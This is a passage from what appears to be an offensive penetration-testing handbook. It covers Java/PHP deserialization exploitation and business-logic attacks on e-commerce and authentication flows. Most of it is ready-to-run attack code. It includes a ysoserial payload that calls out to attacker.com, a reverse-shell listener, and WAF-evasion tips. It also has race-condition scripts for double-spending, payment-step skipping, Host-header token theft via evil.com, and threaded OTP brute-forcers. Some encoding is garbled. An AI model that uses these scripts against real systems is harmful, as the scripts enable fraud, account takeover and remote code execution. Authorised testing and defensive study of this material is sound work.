    public static void main(String[] args) throws Exception {
        // Build chain manually
        // Serialize and deserialize
        // Verify execution
    }
}
EOF

javac TestChain.java
java TestChain
```

### Advanced Chain Techniques

**Chaining across multiple libraries:**

```bash
# Combine gadgets from different dependencies
# Example: Use CommonsCollections for transformation + Spring for injection

# [Inference] Requires all libraries present in classpath
# Success depends on compatible versions
```

**Property-oriented programming (POP) in PHP:**

```php
<?php
// Chain multiple objects via property references

class Step1 {
    public $next;
    function __destruct() {
        echo $this->next; // Triggers __toString()
    }
}

class Step2 {
    public $file;
    function __toString() {
        return file_get_contents($this->file);
    }
}

class Step3 {
    public $cmd;
    function __destruct() {
        eval($this->cmd);
    }
}

// Build chain
$step3 = new Step3();
$step3->cmd = file_get_contents('php://input');

$step2 = new Step2();
$step2->file = "/tmp/commands.txt";

$step1 = new Step1();
$step1->next = $step2;

// When $step1 destructs -> triggers $step2->__toString()
// -> reads file -> $step3 processes content
?>
```

**Type confusion in Java:**

```java
// Exploit type confusion in readObject()
// Force ClassCastException to bypass checks
// [Inference] Requires precise understanding of deserialization internals

// Example pattern:
// 1. Serialize object as Type A
// 2. Modify stream to indicate Type B
// 3. readObject() confused about actual type
// 4. Type confusion leads to unexpected code path
```

**Leveraging collection behaviors:**

```java
// HashSet/HashMap trigger hashCode() and equals()
// Use this to invoke gadget chains

// Pattern:
// 1. Create HashMap with malicious key
// 2. readObject() rebuilds HashMap
// 3. put() operation triggers key.hashCode()
// 4. hashCode() implementation starts gadget chain
```

### Exploitation Workflow

**1. Fingerprint target environment:**

```bash
# Identify framework and library versions
# Check HTTP headers, error messages, dependencies

# Java: Look for X-Powered-By headers
curl -I http://target.com

# .NET: Check for ASP.NET version
curl -I http://target.com | grep "X-AspNet-Version"

# PHP: Check for X-Powered-By: PHP/x.x.x
# Look for framework-specific headers
```

**2. Map available gadgets:**

```bash
# Cross-reference identified libraries with known gadgets
# Use ysoserial, ysoserial.net, phpggc documentation

# Example for Java:
# If Commons Collections 3.2.1 detected -> CC1-CC7 available
# If Spring Framework present -> Spring1/Spring2 available
```

**3. Select optimal chain:**

```bash
# Criteria:
# - Reliability (successful exploitation rate)
# - Compatibility (works with target version)
# - Stealth (minimal side effects)

# CommonsCollections6 often more reliable than CC1
# ObjectDataProvider requires fewer dependencies than TypeConfuseDelegate
```

**4. Generate and deliver payload:**

```bash
# Generate appropriate payload format
# Test in staging environment if possible
# Monitor for execution confirmation

# Example: Java with blind exploitation
java -jar ysoserial-all.jar CommonsCollections6 'curl http://attacker.com/$(whoami)' | base64 -w0

# Send payload
curl -X POST http://target.com/api \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @<(echo <base64_payload> | base64 -d)
```

**5. Confirm exploitation:**

```bash
# Out-of-band confirmation methods:
# - DNS exfiltration (nslookup)
# - HTTP callbacks (curl, wget)
# - File markers (touch /tmp/timestamp)

# Monitor listener:
nc -lvnp 4444               # Reverse shell
python3 -m http.server 8000 # HTTP callback
tcpdump -i any port 53      # DNS queries
```

### Defense Evasion

**Gadget blacklist bypass:**

```bash
# If specific classes are blacklisted
# Find alternative chains using different classes

# [Inference] Requires discovering new gadget chains
# Use GadgetInspector or manual analysis
```

**Serialization format conversion:**

```bash
# Convert between formats to evade detection
# Java: Binary -> XML -> JSON
# .NET: BinaryFormatter -> JSON.NET

# [Unverified] Effectiveness depends on application's deserialization logic
```

**Obfuscation techniques:**

```bash
# Compress payloads (GZIP)
# Encrypt with known keys
# Fragment across multiple requests

# [Inference] May bypass signature-based WAF rules
```

---

## Important Subtopics and Related Areas

**Web Application Firewall (WAF) Bypass:**

- Encoding variations for deserialization payloads
- Fragmentation and timing attacks
- Protocol-level evasion

**Post-Exploitation:**

- Pivoting from deserialization RCE
- Persistence via deserialization backdoors
- Data exfiltration techniques

**Blind Deserialization Exploitation:**

- Time-based confirmation
- Out-of-band data exfiltration
- Error-based information gathering

**Container/Cloud Exploitation:**

- Deserialization in Kubernetes APIs
- Docker API exploitation
- Cloud service-specific gadgets (AWS, Azure, GCP)

---

# Business Logic Flaws

Business logic flaws represent vulnerabilities in the intended workflow and rules of an application rather than traditional security weaknesses like injection or XSS. These flaws exploit the assumptions developers make about how users will interact with their application.

## Price Manipulation

Price manipulation exploits weaknesses in how applications handle pricing data, allowing attackers to purchase items for reduced or negative prices.

### Attack Vectors

**Client-Side Price Modification**

Applications that trust client-supplied pricing data are vulnerable to direct manipulation:

```bash
# Intercept with Burp Suite and modify price parameters
POST /checkout HTTP/1.1
Host: target.com
Content-Type: application/json

{"item_id": 123, "price": 0.01, "quantity": 1}
```

```bash
# Using curl to test direct price manipulation
curl -X POST https://target.com/api/cart/add \
  -H "Content-Type: application/json" \
  -d '{"item_id": 123, "price": -100, "quantity": 1}'
```

**Parameter Tampering Locations**

- Hidden form fields: `<input type="hidden" name="price" value="99.99">`
- JSON request bodies in API calls
- Cookie values storing cart data
- Local storage objects (inspect with browser DevTools)

**Negative Quantity Attacks**

```bash
# Add negative quantities to refund money
POST /cart/update HTTP/1.1

item_id=expensive_item&quantity=-5
```

**Currency Manipulation**

Change currency codes after price calculation:

```bash
# Price calculated in USD, then change to a weaker currency
POST /checkout HTTP/1.1

total=100&currency=IDR  # Indonesian Rupiah instead of USD
```

### Testing Methodology

```bash
# 1. Map all pricing touchpoints with Burp Suite Spider/Crawler
# Set scope to target domain, enable all crawling options

# 2. Identify price parameters in all requests
# Search in Proxy HTTP History for keywords: price, cost, amount, total, subtotal

# 3. Test parameter modification
# Send to Repeater (Ctrl+R), modify values, observe responses

# 4. Test with Burp Intruder for systematic testing
# Position: {"price": Â§100Â§}
# Payload type: Numbers (0-1, negative values, decimals)
```

**Testing Checklist**

- Modify prices to zero or negative values
- Change currency codes post-calculation
- Use decimal precision exploits (e.g., 0.001)
- Test floating-point truncation issues
- Replay old pricing from cached requests
- Modify discount codes or coupon values
- Test price parameters in cookies/localStorage

### Tools & Commands

```bash
# Burp Suite - Automated price parameter detection
# Extensions > BApp Store > Install "Param Miner"
# Right-click target > Extensions > Param Miner > Guess params

# ffuf - Fuzzing price parameters
ffuf -u https://target.com/api/checkout \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"item":"FUZZ","price":0.01}' \
  -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt \
  -mc 200,201

# wfuzz - Testing price values
wfuzz -c -z range,0-1000 \
  -d "item_id=123&price=FUZZ" \
  --hh 0 \
  https://target.com/cart/update
```

## Race Conditions

Race conditions occur when application logic depends on the order of operations, allowing attackers to exploit timing windows between checks and actions.

### Attack Scenarios

**Coupon Code Reuse**

Exploiting the time gap between coupon validation and invalidation:

```bash
# Single-threaded baseline
curl -X POST https://target.com/apply-coupon \
  -H "Cookie: session=abc123" \
  -d "coupon=SAVE50"

# Race condition exploitation with parallel requests
# Using GNU Parallel
seq 1 100 | parallel -j 100 \
  'curl -X POST https://target.com/apply-coupon \
   -H "Cookie: session=abc123" \
   -d "coupon=SAVE50" &'
```

**Double-Spending**

Simultaneously spending the same credits/balance multiple times:

```python
#!/usr/bin/env python3
# race_condition_exploit.py

import requests
import threading

target_url = "https://target.com/purchase"
session_cookie = "session=abc123"
headers = {"Cookie": session_cookie}
data = {"item_id": "expensive_item", "use_balance": "true"}

def make_purchase():
    response = requests.post(target_url, headers=headers, data=data)
    print(f"Status: {response.status_code}, Balance: {response.text}")

# Launch simultaneous requests
threads = []
for i in range(20):
    thread = threading.Thread(target=make_purchase)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
```

**Account Balance Manipulation**

```bash
# Turbo Intruder script for Burp Suite (faster than standard Intruder)
# Extensions > BApp Store > Install "Turbo Intruder"

# turbo_race.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100,
                          pipeline=False)
    
    request = '''POST /withdraw HTTP/1.1
Host: target.com
Cookie: session=abc123

amount=100'''
    
    for i in range(100):
        engine.queue(request)

def handleResponse(req, interesting):
    if '200' in req.response:
        table.add(req)
```

### Testing Methodology

**Identifying Race Condition Vulnerabilities**

1. **Find State-Changing Operations**
    
    - Gift card redemptions
    - Coupon applications
    - Balance transfers
    - Limited quantity purchases
    - Token/credit spending
2. **Test Single Request First**
    

```bash
# Baseline - single request behavior
curl -v -X POST https://target.com/redeem-gift-card \
  -H "Cookie: session=abc123" \
  -d "code=GIFT500" \
  2>&1 | tee baseline.txt
```

3. **Race Condition Testing**

```bash
# Method 1: Bash subshells with background jobs
for i in {1..50}; do
  (curl -X POST https://target.com/redeem \
   -H "Cookie: session=abc123" \
   -d "code=GIFT500" &)
done
wait

# Method 2: Using xargs for parallel execution
printf 'url = "https://target.com/redeem"\n%.0s' {1..50} | \
  xargs -P 50 -I {} curl -X POST {} \
  -H "Cookie: session=abc123" \
  -d "code=GIFT500"
```

### Tools & Commands

```bash
# Race The Web (RTW) - Specialized race condition tool
git clone https://github.com/TheHackerDev/race-the-web
cd race-the-web
go build

# config.toml example
[[requests]]
method = "POST"
url = "https://target.com/apply-coupon"
cookies = ["session=abc123"]
body = "coupon=SAVE50"
count = 100

./race-the-web -config config.toml

# Asyncio-based Python race condition script
cat > async_race.py << 'EOF'
import asyncio
import aiohttp

async def send_request(session, url, data, headers):
    async with session.post(url, data=data, headers=headers) as response:
        text = await response.text()
        print(f"{response.status}: {text[:100]}")

async def main():
    url = "https://target.com/purchase"
    data = {"item_id": "123", "quantity": "1"}
    headers = {"Cookie": "session=abc123"}
    
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, url, data, headers) for _ in range(100)]
        await asyncio.gather(*tasks)

asyncio.run(main())
EOF

python3 async_race.py
```

**Burp Suite Race Condition Testing**

1. Send request to Repeater
2. Create multiple tabs with identical requests (Ctrl+R multiple times)
3. Group tabs together (right-click > Send group in parallel)
4. Send all requests simultaneously

[Inference] Modern frameworks often implement database-level transaction locks, but race conditions may still exist in:

- Redis/cache layer operations before database writes
- Multi-step workflows without proper locking
- Microservice architectures with eventual consistency

## Order Fulfillment Bypass

Exploiting flaws in the checkout and order processing workflow to obtain items without proper payment or authorization.

### Attack Vectors

**Payment Step Skipping**

Manipulating workflow state to bypass payment:

```bash
# Normal flow: cart > shipping > payment > confirmation
# Attack: Jump directly to confirmation

# Step 1: Add items to cart
curl -X POST https://target.com/cart/add \
  -H "Cookie: session=abc123" \
  -d "item_id=123&quantity=1"

# Step 2: Skip to order confirmation endpoint
curl -X GET https://target.com/order/confirm/ORDER_ID \
  -H "Cookie: session=abc123"

# Or POST to completion endpoint directly
curl -X POST https://target.com/order/complete \
  -H "Cookie: session=abc123" \
  -d "order_id=12345&status=paid"
```

**Status Manipulation**

```bash
# Change order status parameters
POST /order/update HTTP/1.1
Host: target.com
Cookie: session=abc123

order_id=12345&status=completed&payment_status=paid
```

**Workflow State Confusion**

```bash
# Complete payment step but revert to cart modification
# 1. Progress to payment page, capture session state
# 2. Complete payment
# 3. Replay cart modification request with post-payment session
# 4. Finalize order

# Using Burp Suite:
# - Capture all requests during normal checkout
# - Note session/state tokens at each step
# - Replay requests in modified order
```

### Testing Methodology

**Workflow Enumeration**

```bash
# Map all checkout-related endpoints
gospider -s https://target.com -d 3 --sitemap | grep -i "checkout\|cart\|order\|payment"

# Test direct access to completion endpoints
for endpoint in confirm complete finalize success; do
  curl -v https://target.com/order/$endpoint/12345 \
    -H "Cookie: session=abc123" 2>&1 | grep -i "200\|302"
done
```

**Parameter Discovery**

```bash
# Arjun - HTTP parameter discovery
arjun -u https://target.com/order/update \
  --stable \
  -m POST \
  -H "Cookie: session=abc123"

# Test discovered parameters with status values
# Common parameter names: status, payment_status, order_status, state, stage
```

**Sequential Testing Approach**

1. Complete legitimate purchase, capture all requests in Burp
2. Extract order ID, session tokens, state parameters
3. Start new session, replay final confirmation request with new session
4. Test parameter manipulation in each workflow step
5. Test skipping intermediate steps

### Tools & Commands

```bash
# Burp Suite - Match and Replace rules for automatic parameter injection
# Proxy > Options > Match and Replace > Add

# Example: Auto-inject payment status
Type: Request body
Match: (order_id=\d+)
Replace: $1&payment_status=paid&status=completed

# Custom Python workflow manipulation
cat > workflow_bypass.py << 'EOF'
import requests

session = requests.Session()
base_url = "https://target.com"

# Step 1: Add to cart
cart_resp = session.post(f"{base_url}/cart/add", 
                        data={"item_id": "123", "quantity": "10"})
print(f"Cart: {cart_resp.status_code}")

# Step 2: Skip to order creation with manipulated parameters
order_resp = session.post(f"{base_url}/order/create",
                         data={"payment_verified": "true",
                               "status": "paid"})
print(f"Order: {order_resp.status_code} - {order_resp.text}")

# Step 3: Attempt direct confirmation
if '"order_id"' in order_resp.text:
    import json
    order_id = json.loads(order_resp.text)["order_id"]
    confirm_resp = session.get(f"{base_url}/order/confirm/{order_id}")
    print(f"Confirm: {confirm_resp.status_code}")
EOF

python3 workflow_bypass.py
```

## Inventory Manipulation

Exploiting insufficient inventory checking to purchase more items than available or manipulate stock levels.

### Attack Vectors

**Negative Inventory Creation**

```bash
# Add items beyond available stock
POST /cart/add HTTP/1.1
Host: target.com

item_id=123&quantity=99999

# Check if inventory validation occurs at cart vs checkout
# If validation is only at display, backend may accept
```

**Race Condition on Limited Stock**

```python
#!/usr/bin/env python3
# limited_stock_race.py

import requests
import threading
import time

url = "https://target.com/purchase"
session_cookie = "session=abc123"
limited_item_id = "999"  # Item with stock: 1

def attempt_purchase(thread_id):
    cookies = {"session": f"{session_cookie}_{thread_id}"}
    data = {"item_id": limited_item_id, "quantity": "1"}
    response = requests.post(url, cookies=cookies, data=data)
    if "success" in response.text.lower():
        print(f"[+] Thread {thread_id}: SUCCESSFUL PURCHASE")
    else:
        print(f"[-] Thread {thread_id}: Failed - {response.status_code}")

# Create multiple sessions attempting to buy the single item
threads = []
for i in range(50):
    t = threading.Thread(target=attempt_purchase, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

**Reserved Inventory Manipulation**

```bash
# Exploit "hold" mechanisms that reserve inventory
# 1. Add limited item to cart (inventory reserved)
# 2. Don't complete purchase (inventory stays reserved)
# 3. Repeat with multiple sessions to exhaust stock

# Automation
for i in {1..100}; do
  curl -X POST https://target.com/cart/add \
    -H "Cookie: session=new_session_$i" \
    -d "item_id=limited_item&quantity=1" &
done
```

**Quantity Parameter Overflow**

```bash
# Test integer overflow in quantity fields
curl -X POST https://target.com/cart/add \
  -d "item_id=123&quantity=2147483647"  # Max 32-bit signed int

curl -X POST https://target.com/cart/add \
  -d "item_id=123&quantity=-2147483648"  # Min 32-bit signed int

# Test for wrapping to negative, then addition resulting in bypass
```

### Testing Methodology

**Inventory Validation Testing**

```bash
# 1. Identify inventory-constrained items
# Look for "Only X left" or "Limited stock" indicators

# 2. Test where validation occurs
# Add max quantity to cart, observe at which step rejection happens:
# - Client-side (JavaScript alert) - easily bypassed
# - Cart page load - bypass by skipping cart view
# - Checkout initiation - test direct checkout API
# - Payment processing - inventory checked too late
# - Order confirmation - critical flaw if validation here

# 3. Test with Burp Suite Repeater
# Send purchase request multiple times rapidly
# Observe if stock can go negative or if later requests succeed
```

**Multi-Session Stock Exhaustion**

```bash
# Create cookie jar for session management
mkdir cookies

# Generate multiple sessions
for i in {1..50}; do
  curl -c cookies/session_$i.txt \
    https://target.com/login \
    -d "username=test$i&password=test"
done

# Simultaneously add limited items from all sessions
for i in {1..50}; do
  curl -b cookies/session_$i.txt \
    -X POST https://target.com/cart/add \
    -d "item_id=limited&quantity=5" &
done
wait
```

### Tools & Commands

```bash
# SQLMap - Test for injection in inventory queries
sqlmap -u "https://target.com/api/inventory?item_id=123" \
  --cookie="session=abc123" \
  --level=3 \
  --risk=2 \
  --batch

# Custom inventory fuzzing with ffuf
# Create payload list for quantity values
cat > quantities.txt << EOF
-1
0
999999
2147483647
-2147483648
1.5
0.001
null
undefined
EOF

ffuf -u https://target.com/cart/add \
  -X POST \
  -d "item_id=123&quantity=FUZZ" \
  -w quantities.txt \
  -H "Cookie: session=abc123" \
  -mc all \
  -fc 400
```

## General Business Logic Testing Approach

### Reconnaissance

```bash
# 1. Spider/crawl application
# Burp Suite: Target > Site map
# Or use automated tools:
katana -u https://target.com -d 5 -jc -kf all -o crawl_results.txt

# 2. Identify all user-controllable transaction parameters
grep -Ei "price|cost|amount|quantity|discount|coupon|balance|credit" crawl_results.txt

# 3. Map user roles and privilege levels
# Create multiple accounts, document features available to each
```

### Systematic Testing

```bash
# Test matrix: Modify each parameter with these values
# - Minimum (0, -1)
# - Maximum (INT_MAX, large numbers)
# - Negative values
# - Decimal values
# - Special chars/injection payloads
# - Null/empty/undefined

# Automate with Burp Intruder
# Payload positions: all numeric/currency parameters
# Payload sets: Sniper attack for each parameter individually
```

### Documentation & Validation

**Proof of Concept Template**

```markdown
## Business Logic Flaw: [Type]

**Endpoint:** POST /api/checkout
**Parameter:** price
**Vulnerability:** Client-side price validation only

### Steps to Reproduce:
1. Add item to cart (ID: 123, normal price: $99.99)
2. Intercept checkout request with Burp Suite
3. Modify POST body: {"item_id": 123, "price": 0.01}
4. Forward request
5. Observe successful purchase at modified price

### Impact:
- Financial loss from price manipulation
- Unlimited item purchases at arbitrary prices

### Evidence:
[Screenshots/response data]
```

## Key Tools Summary

```bash
# Essential toolkit for business logic testing

# 1. Burp Suite Professional (or Community)
# - Proxy, Repeater, Intruder, Turbo Intruder extension

# 2. Python with requests/aiohttp
pip3 install requests aiohttp

# 3. Parallel execution tools
sudo apt install parallel

# 4. Race condition tools
git clone https://github.com/TheHackerDev/race-the-web

# 5. Parameter discovery
go install github.com/s0md3v/Arjun@latest

# 6. Crawling/spidering
go install github.com/projectdiscovery/katana/cmd/katana@latest
```

## Refund Exploitation

Refund exploitation targets weaknesses in transaction reversal mechanisms where applications fail to properly validate refund conditions, track state changes, or enforce business rules.

### Common Vulnerability Patterns

**Negative Quantity Refunds** Applications may allow negative values in refund requests, potentially crediting accounts instead of debiting them. Test by intercepting refund requests and manipulating quantity parameters.

```bash
# Burp Suite Repeater modification example
POST /api/refund HTTP/1.1
Content-Type: application/json

{"order_id": "12345", "quantity": -5, "amount": 100}
```

**Race Condition Refunds** Multiple simultaneous refund requests for the same transaction may bypass balance checks due to asynchronous processing or inadequate locking mechanisms.

```bash
# Using ffuf for concurrent requests
ffuf -u https://target.com/refund -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"order_id":"12345"}' \
  -t 50 -rate 100
```

```python
# Python threading approach for race condition testing
import requests
import threading

def send_refund():
    requests.post('https://target.com/refund',
                  json={'order_id': '12345'},
                  cookies={'session': 'YOUR_SESSION'})

threads = []
for i in range(20):
    t = threading.Thread(target=send_refund)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

**Partial Refund Manipulation** Applications may fail to validate that partial refunds don't exceed original amounts across multiple requests.

Testing methodology:

1. Purchase item for $100
2. Request partial refund of $60
3. Request second partial refund of $60
4. Check if both process despite exceeding original amount

**State Transition Bypass** Refunds may be requested for orders in states where refunds shouldn't be permitted (shipped, delivered, already refunded).

```bash
# Test state manipulation with curl
curl -X POST https://target.com/refund \
  -H "Cookie: session=YOUR_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"order_id":"67890","status":"pending"}' \
  -x http://127.0.0.1:8080  # Route through Burp
```

### Testing Workflow

1. **Map the refund process completely**

```bash
# Spider the application with parameters
gospider -s https://target.com -c 10 -d 3 --sitemap
```

2. **Identify all refund-related endpoints**

- `/refund`, `/return`, `/cancel`, `/chargeback`
- API endpoints: `/api/v1/orders/{id}/refund`

3. **Analyze request parameters**

- Order ID, quantity, amount, reason, account details
- Hidden parameters: status, approved, verified

4. **Test parameter manipulation**

```bash
# Using wfuzz to fuzz parameters
wfuzz -z range,1-1000 -d '{"order_id":"FUZZ"}' \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  https://target.com/api/refund
```

5. **Monitor response timing for async operations**

```python
import time
import requests

start = time.time()
r = requests.post('https://target.com/refund', json={'order_id': '12345'})
elapsed = time.time() - start
print(f"Response time: {elapsed}s - Status: {r.status_code}")
```

### Advanced Techniques

**Double-Spending via Refund** [Inference] If an application doesn't lock funds during refund processing, you may be able to spend the refunded amount before the original transaction completes its reversal state update.

**Currency Manipulation** Refund in different currency than purchase if application doesn't normalize exchange rates properly.

```json
POST /refund
{"order_id": "12345", "amount": 100, "currency": "EUR"}
// Original purchase was 100 USD
```

**Refund Chaining** Create circular refund dependencies where refunding item A triggers refund of item B, which references item A.

## Account Verification Bypass

Account verification mechanisms ensure users prove ownership of contact information (email, phone) or identity documents. Bypasses allow account creation or access without completing verification.

### Email Verification Bypass Techniques

**Direct Object Reference** Verification tokens or user IDs may be predictable or enumerable.

```bash
# Test sequential token enumeration
for i in {1000..1100}; do
  curl -s "https://target.com/verify?token=$i" | grep -i "success"
done
```

**Token Parameter Manipulation** Verification links often contain user identifiers and tokens as separate parameters.

```
Original: https://target.com/verify?email=user@test.com&token=abc123
Test: https://target.com/verify?email=attacker@evil.com&token=abc123
Test: https://target.com/verify?email=user@test.com&token=
Test: https://target.com/verify?email=user@test.com
```

**Host Header Injection for Token Theft** During registration, manipulate Host header to receive verification email with attacker-controlled domain links.

```bash
curl -X POST https://target.com/register \
  -H "Host: evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=victim@target.com&password=pass123"
```

The generated verification link may use the Host header value: `https://evil.com/verify?token=VICTIM_TOKEN`

**Parameter Pollution** Some parsers may accept multiple email parameters, verifying one while activating another.

```bash
curl -X POST "https://target.com/register" \
  -d "email=attacker@evil.com&email=victim@target.com&password=pass"
```

**Response Manipulation** Applications performing client-side verification checks can be bypassed by intercepting responses.

```javascript
// In Burp, replace response:
{"verified": false, "status": "pending"}
// with:
{"verified": true, "status": "active"}
```

**Time-Based Exploitation** [Inference] If verification tokens expire but account state persists, race between account creation and token validation may allow access.

```python
import requests
import threading

def create_account():
    requests.post('https://target.com/register',
                  data={'email': 'test@test.com', 'password': 'pass'})

def login():
    time.sleep(0.5)  # Brief delay
    requests.post('https://target.com/login',
                  data={'email': 'test@test.com', 'password': 'pass'})

t1 = threading.Thread(target=create_account)
t2 = threading.Thread(target=login)
t1.start()
t2.start()
```

### Testing Methodology

1. **Intercept the verification flow completely**

```bash
# Start Burp proxy
burpsuite &

# Configure browser proxy to 127.0.0.1:8080
# Complete registration process while capturing all requests
```

2. **Identify verification components**

- Token format (UUID, numeric, hash-based)
- Token location (URL, POST body, headers)
- Associated identifiers (user_id, email)

3. **Token analysis**

```bash
# If tokens appear to be base64
echo "dXNlcjEyMzQ1" | base64 -d

# If tokens appear to be hex
echo "75736572313233343536" | xxd -r -p

# Test for JWT tokens
echo "eyJhbGc..." | cut -d. -f2 | base64 -d 2>/dev/null
```

4. **Test verification endpoint isolation**

```bash
# Can you access verification endpoint without session?
curl "https://target.com/verify?token=abc123" -v

# Does it require authentication?
curl "https://target.com/verify?token=abc123" \
  -H "Cookie: session=ATTACKER_SESSION"
```

5. **Boolean-based bypass attempts**

```bash
# Test various boolean parameters
curl "https://target.com/verify?verified=true"
curl "https://target.com/verify?verified=1"
curl "https://target.com/api/user/123" -X PATCH \
  -d '{"verified": true}' \
  -H "Content-Type: application/json"
```

### Advanced Bypass Vectors

**Unicode/IDN Homograph** Register with visually similar email using Unicode characters.

```bash
# Register with: Ð°ttacker@example.com (Cyrillic 'Ð°')
# Instead of: attacker@example.com (Latin 'a')
curl -X POST https://target.com/register \
  -d "email=%D0%B0ttacker@example.com&password=pass"
```

**Email Provider Aliasing** Gmail ignores dots and plus-signs, allowing multiple registrations.

```
Original: user@gmail.com
Aliases: u.ser@gmail.com, user+bypass@gmail.com
```

**Verification Code Reuse** Test if verification codes can be used multiple times or for different accounts.

**Null Byte Injection** [Inference] Some parsers may truncate at null bytes.

```bash
curl "https://target.com/verify?email=attacker@evil.com%00victim@target.com"
```

## OTP Bypass

One-Time Password mechanisms provide additional authentication layers. Bypasses defeat these controls through implementation weaknesses rather than brute force.

### Common OTP Vulnerabilities

**Rate Limiting Absence** Without rate limiting, OTPs can be brute-forced despite being time-limited.

```python
import requests

for code in range(100000, 1000000):
    r = requests.post('https://target.com/verify-otp',
                      data={'otp': str(code)},
                      cookies={'session': 'YOUR_SESSION'})
    if 'success' in r.text.lower():
        print(f"Valid OTP: {code}")
        break
```

**Distributed Brute Force** Bypass IP-based rate limiting by rotating requests across endpoints or parameters.

```bash
# Using Turbo Intruder (Burp extension) example configuration
# This would be placed in a Python script for Turbo Intruder

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='https://target.com/verify',
                           concurrentConnections=5)
    
    for code in range(100000, 1000000):
        engine.queue(target.req, str(code))

def handleResponse(req, interesting):
    if '200' in req.status:
        table.add(req)
```

**Response Manipulation** Client-side OTP validation can be bypassed by modifying responses.

```javascript
// Intercept in Burp Suite Match/Replace:
// Match: {"valid":false}
// Replace: {"valid":true}
```

**OTP Code Reuse** Test if OTP codes remain valid after successful use.

```bash
# Use same OTP multiple times
curl -X POST https://target.com/verify-otp \
  -d "otp=123456" -c cookies.txt
  
# Try again with saved cookies
curl -X POST https://target.com/verify-otp \
  -d "otp=123456" -b cookies.txt
```

**Predictable OTP Generation** [Inference] If OTPs are generated using weak randomness or time-based algorithms without sufficient entropy:

```python
import time
import hashlib

# Test if OTP is time-based (example pattern)
current_time = int(time.time())
potential_otp = hashlib.md5(str(current_time).encode()).hexdigest()[:6]
print(f"Predicted OTP: {potential_otp}")
```

**OTP Endpoint Authentication Bypass** Verify OTP endpoint may not require authentication, allowing enumeration.

```bash
# Test OTP verification without session
curl -X POST https://target.com/verify-otp \
  -d "phone=+1234567890&otp=123456"

# Try with different user identifiers
for user_id in {1..100}; do
  curl -s -X POST https://target.com/verify-otp \
    -d "user_id=$user_id&otp=123456" | grep -i "success"
done
```

**OTP Token Leakage** Check for OTP exposure in:

- Response bodies during generation
- JavaScript variables
- Referrer headers
- Server logs accessible via path traversal

```bash
# Check response during OTP generation
curl -X POST https://target.com/send-otp \
  -H "Cookie: session=YOUR_SESSION" \
  -d "phone=+1234567890" -v
```

**SMS OTP Interception** [Unverified - varies by target infrastructure] Some applications use third-party SMS gateways with APIs that may expose messages.

### Testing Workflow

1. **Trigger OTP generation and capture request**

```bash
curl -X POST https://target.com/send-otp \
  -H "Cookie: session=YOUR_SESSION" \
  -d "method=sms" \
  -x http://127.0.0.1:8080
```

2. **Analyze OTP format**

- Length (4-6 digits common)
- Character set (numeric, alphanumeric)
- Pattern detection (sequential, time-based)

3. **Test rate limiting**

```bash
# Automated testing with hydra-like approach
for i in {1..100}; do
  curl -X POST https://target.com/verify-otp \
    -d "otp=123456" \
    -H "Cookie: session=YOUR_SESSION" \
    -w "Attempt $i: %{http_code}\n" \
    -s -o /dev/null
done
```

4. **Test OTP validity window**

```bash
# Request OTP
curl -X POST https://target.com/send-otp -d "phone=+1234567890"

# Wait and test at intervals
sleep 60  && curl -X POST https://target.com/verify-otp -d "otp=123456"
sleep 300 && curl -X POST https://target.com/verify-otp -d "otp=123456"
sleep 600 && curl -X POST https://target.com/verify-otp -d "otp=123456"
```

5. **Parameter tampering**

```json
// Original request
{"phone": "+1234567890", "otp": "123456"}

// Test variations
{"phone": "+1234567890", "otp": "123456", "verified": true}
{"phone": "+1234567890", "otp": "000000"}
{"phone": "+0000000000", "otp": "123456"}
{"otp": "123456"}  // Remove phone parameter
```

### Advanced OTP Bypass Techniques

**Race Condition on OTP Generation** Generate multiple OTPs simultaneously and test if all remain valid.

```python
import requests
import threading

def generate_otp():
    requests.post('https://target.com/send-otp',
                  data={'phone': '+1234567890'},
                  cookies={'session': 'YOUR_SESSION'})

threads = []
for i in range(10):
    t = threading.Thread(target=generate_otp)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

**OTP Bypass via Password Reset Flow** [Inference] Some applications may have weaker OTP validation in password reset compared to login flow.

**Backup Codes Exploitation** If backup codes are provided during MFA setup, test if they have same vulnerabilities as OTPs (reuse, predictability).

**TOTP Seed Extraction** For Time-based OTP, if QR code or seed is accessible, future OTPs can be generated.

```bash
# If you obtain TOTP seed
oathtool --totp --base32 "JBSWY3DPEHPK3PXP"
```

**OTP Session Fixation** Test if OTP verification session can be fixed or transferred.

```bash
# Request OTP with victim's phone
curl -X POST https://target.com/send-otp \
  -d "phone=+1VICTIM" \
  -c session_cookies.txt

# Verify with attacker's session
curl -X POST https://target.com/verify-otp \
  -d "otp=123456" \
  -H "Cookie: session=ATTACKER_SESSION"
```

### Tooling Reference

**Burp Suite Extensions**

- Turbo Intruder: High-speed testing for race conditions and brute force
- Autorize: Test authorization bypass across different user contexts

**Custom Python Scripts**

```python
# OTP brute force template with threading
import requests
from concurrent.futures import ThreadPoolExecutor

def test_otp(code):
    r = requests.post('https://target.com/verify-otp',
                      data={'otp': str(code).zfill(6)},
                      cookies={'session': 'YOUR_SESSION'})
    if r.status_code == 200 and 'success' in r.text:
        return code
    return None

with ThreadPoolExecutor(max_workers=10) as executor:
    results = executor.map(test_otp, range(100000, 1000000))
    valid_codes = [r for r in results if r is not None]
    
print(f"Valid codes: {valid_codes}")
```

**ffuf for Parameter Discovery**

```bash
ffuf -u https://target.com/verify-otp \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"otp":"123456","FUZZ":"true"}' \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200
```

## General Business Logic Testing Principles

**State Machine Mapping** Document all states and transitions:

1. Create state diagram of user flows
2. Identify critical state transitions (pending â†’ verified, unpaid â†’ paid)
3. Test transitions in unintended orders

**Privilege Boundaries** Test operations across different user privilege levels:

```bash
# As low-privilege user, attempt high-privilege operations
